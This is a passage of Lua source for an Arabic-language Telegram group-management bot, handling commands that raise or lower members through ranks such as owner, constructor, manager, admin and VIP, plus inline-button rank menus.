ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المميزين العام")  
end end
--     Source WAAD     --
--   Set AIANConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه مالك\n✓")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه مالك\n✓")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and ChCheck(msg) then
local user = text:match('رفع مالك (%d+)')
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه مالك\n✓")  
end
--     Source WAAD     --
--   Rem AIANConstructor   --
if text ==('تنزيل مالك') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من المالكين\n✓")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^تنزيل مالك @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
--     Source WAAD     --
--  Set BasicConstructor  --
if AIANConstructor(msg) then
if text ==('رفع منشئ اساسي') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه منشئ اساسي")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه منشئ اساسي")  
end
--     Source WAAD     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله منشئ اساسي")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not AIANConstructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
--     Source WAAD     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المنشئين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAIAN:sadd(WAAD..'AIAN:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المنشئين")  
end
--     Source WAAD     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المنشئين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAIAN:srem(WAAD..'AIAN:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source WAAD     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المدراء")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير (%d+)')
DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المدراء")  
end
--     Source WAAD     --
--       Rem Manager      --
if text ==('تنزيل مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المدراء")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المدراء")  
end 
--     Source WAAD     --
--       Set Cleaner      --
if text ==('رفع منظف') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:sadd(WAAD..'AIAN:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المنظفين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and ChCheck(msg) then
local user = text:match('رفع منظف (%d+)')
DevAIAN:sadd(WAAD..'AIAN:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المنظفين")  
end
--     Source WAAD     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المنظفين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المنظفين")  
end end
--     Source WAAD     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة الادمنيه")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة الادمنيه")  
end
--     Source WAAD     --
--        Rem admin       --
if text ==('تنزيل ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source WAAD     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم رفعه في قائمة المميزين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and ChCheck(msg) then
local user = text:match('رفع مميز (%d+)')
if not BasicConstructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:ProSet"..msg.chat_id_) then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم رفعه في قائمة المميزين")  
end
--     Source WAAD     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تنزيله من قائمة المميزين")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌯︙تم تنزيله من قائمة المميزين")  
end end 
--     Source WAAD     --
--       Set Inline       --
if text ==('رفع رتبه') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
return false  
end
local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
if Sudo(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="رفع مطور ثانوي",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SecondSudo(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SudoBot(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif AIANConstructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif BasicConstructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Constructor(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Manager(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif Admin(msg) then
inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
end
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     Source WAAD     --
--       Rem Inline       --
if text ==('تنزيل رتبه') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
return false  
end
local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
if Sudo(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="تنزيل مطور ثانوي",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SecondSudo(msg) then
inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
elseif SudoBot(msg) then
